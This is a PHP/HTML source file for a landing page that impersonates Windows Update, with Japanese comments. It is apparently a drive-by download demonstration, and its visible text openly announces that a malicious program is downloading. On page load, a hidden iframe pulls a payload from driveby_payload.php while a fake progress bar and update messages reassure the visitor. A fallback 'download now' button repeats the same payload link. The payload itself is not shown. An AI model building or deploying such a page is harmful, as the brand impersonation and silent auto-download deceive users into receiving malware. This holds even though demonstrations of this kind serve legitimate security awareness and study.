<?php
// driveby_landing.php  — Windows Update風ランディング + 即時ダウンロード開始（非侵襲）
// 表示はページ遷移のまま、ダウンロードは非表示の iframe で即スタートします。
session_start();

// 任意トークン（あればpayloadに引き継ぐ）
$t = isset($_GET['t']) ? preg_replace('/[^a-zA-Z0-9]/', '', $_GET['t']) : '';
$payloadUrl = 'driveby_payload.php' . ($t ? ('?t=' . $t) : '');
?>
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Windows Update</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* Windows 風配色 */
    .win-bg { background: #0c2a4b; }
    .win-accent { color: #d7f0ff; }
    .win-card { background: #0f3a66; }
    .update-icon {
      width: 48px; height: 48px; border-radius: 8px; background: #0ea5e9;
      display: inline-flex; align-items: center; justify-content: center;
      box-shadow: inset 0 0 8px rgba(255,255,255,0.25);
    }
    .progress-holder { background: rgba(255,255,255,0.15); }
    .progress-bar { width: 0%; transition: width .35s ease; }
    .dots::after {
      content: '…';
      animation: dots 1.2s steps(3, end) infinite;
    }
    @keyframes dots {
      0% { content: ''; } 33% { content: '.'; }
      66% { content: '..'; } 100% { content: '...'; }
    }
  </style>
</head>
<body class="win-bg min-h-screen text-white">
  <!-- ヘッダー（Windows Update風） -->
  <header class="border-b border-white/10">
    <div class="max-w-4xl mx-auto px-4 py-4 flex items-center gap-3">
      <div class="update-icon">
        <!-- Windows風の矢印アイコン -->
        <svg viewBox="0 0 24 24" class="w-7 h-7 text-white" fill="none" stroke="currentColor" stroke-width="1.6">
          <path d="M12 3v10m0 0l4-4m-4 4l-4-4" stroke-linecap="round" stroke-linejoin="round"/>
          <path d="M4 15v4a2 2 0 002 2h12a2 2 0 002-2v-4" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <div>
        <div class="text-xl font-semibold win-accent">Windows Update</div>
        <div class="text-xs text-white/60">設定 &gt; 更新とセキュリティ &gt; Windows Update</div>
      </div>
    </div>
  </header>

  <!-- コンテンツ -->
  <main class="max-w-4xl mx-auto px-4 py-8">
    <div class="win-card/80 bg-white/5 backdrop-blur-sm rounded-xl border border-white/10 p-6 md:p-8 shadow-xl">
      <!-- ステータス -->
      <div class="flex items-start md:items-center justify-between gap-4 flex-col md:flex-row">
        <div class="flex-1">
          <h1 class="text-2xl md:text-3xl font-bold win-accent mb-1">ドライブバイダウンロードを開始します</h1>
          <p class="text-white/80">
            悪性なプログラムが自動的にダウンロードが開始されます。しばらくお待ちください。
          </p>
        </div>
        <div class="text-right">
          <div class="text-white/60 text-sm">最終チェック: 今日</div>
          <div class="text-white/80 font-semibold">準備中</div>
        </div>
      </div>

      <!-- プログレス -->
      <div class="mt-8">
        <div class="flex items-center justify-between text-sm text-white/80 mb-2">
          <span>ダウンロード</span>
          <span id="percent">0%</span>
        </div>
        <div class="w-full h-3 rounded-full overflow-hidden progress-holder">
          <div id="bar" class="h-3 bg-sky-400 progress-bar"></div>
        </div>

        <!-- 詳細メッセージ -->
        <div class="mt-4 grid md:grid-cols-2 gap-4 text-sm">
          <div class="bg-white/5 border border-white/10 rounded-lg p-4">
            <div class="font-semibold">品質更新プログラム</div>
            <div id="msg-1" class="text-white/70 mt-1">更新プログラムをチェックしています<span class="dots"></span></div>
          </div>
          <div class="bg-white/5 border border-white/10 rounded-lg p-4">
            <div class="font-semibold">セキュリティインテリジェンス</div>
            <div id="msg-2" class="text-white/70 mt-1">定義ファイルを適用しています<span class="dots"></span></div>
          </div>
        </div>
      </div>

      <!-- 手動トリガ（念のため） -->
      <div class="mt-8 flex items-center justify-between">
        <div class="text-white/60 text-xs">
          ダウンロードが開始されない場合は、以下のボタンをクリックしてください。
        </div>
        <div class="flex gap-3">
          <a href="<?= htmlspecialchars($payloadUrl, ENT_QUOTES) ?>"
             class="px-4 py-2 rounded-md bg-sky-500 hover:bg-sky-600 font-semibold">
            今すぐダウンロード
          </a>
        </div>
      </div>
    </div>
  </main>

  <!-- 非表示 iframe で“即時”ダウンロード開始 -->
  <iframe id="hiddenDownloader" class="hidden" title="downloader"></iframe>

  <script>
    // 進捗アニメーション（見た目用）
    (function(){
      const bar = document.getElementById('bar');
      const percent = document.getElementById('percent');
      const msg1 = document.getElementById('msg-1');
      const msg2 = document.getElementById('msg-2');
      let p = 0;

      // ミリ秒間隔でスムーズに進めつつ、途中で停滞っぽさを演出
      const timer = setInterval(()=>{
        // 加速→減速→最後ちょい伸び をざっくり再現
        if (p < 35) p += Math.random() * 6 + 2;         // 0-35% 速め
        else if (p < 80) p += Math.random() * 3 + 0.6;  // 35-80% ちょい停滞
        else if (p < 98) p += Math.random() * 1.2 + 0.2;// 80-98% じわっと
        else p = 99;

        if (p > 99) p = 99;
        bar.style.width = p.toFixed(0) + '%';
        percent.textContent = p.toFixed(0) + '%';

        // メッセージを段階的に変更
        if (p > 20 && p <= 50) {
          msg1.textContent = '更新プログラムをダウンロードしています…';
        } else if (p > 50 && p <= 75) {
          msg1.textContent = 'セキュリティコンポーネントを展開しています…';
          msg2.textContent = '脅威定義を最適化しています…';
        } else if (p > 75 && p < 98) {
          msg1.textContent = '検証と準備を行っています…';
          msg2.textContent = '再起動は不要です';
        }
      }, 120);

      // ページ表示と同時に非表示iframeでダウンロード開始（即時）
      window.addEventListener('load', function(){
        const iframe = document.getElementById('hiddenDownloader');
        iframe.src = '<?= htmlspecialchars($payloadUrl, ENT_QUOTES) ?>';
        // 見た目の最終完了演出
        setTimeout(()=>{
          p = 100;
          bar.style.width = '100%';
          percent.textContent = '100%';
          clearInterval(timer);
          msg1.textContent = 'ダウンロードが完了しました';
          msg2.textContent = 'インストールの準備ができました';
        }, 3500); // 実ダウンロードより少し早めでもOK
      });
    })();
  </script>
</body>
</html>
